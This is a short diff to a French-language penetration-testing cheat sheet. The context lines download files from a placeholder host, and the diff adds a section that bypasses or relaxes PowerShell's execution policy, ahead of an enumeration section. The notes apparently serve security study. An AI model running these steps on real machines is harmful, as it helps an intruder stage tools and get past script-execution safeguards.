@@ -22,6 +22,14 @@ iwr -uri http://<IP>/fichier -Outfile fichier
 curl -o fichier http://<IP>/fichier
 ```
 
+**ExecutionPolicy**
+
+```powershell
+powershell -ep bypass
+Get-ExecutionPolicy
+Set-ExecutionPolicy Unrestricted -Scope Process
+```
+
 ## Enumération
 
 ### Enumération manuelle
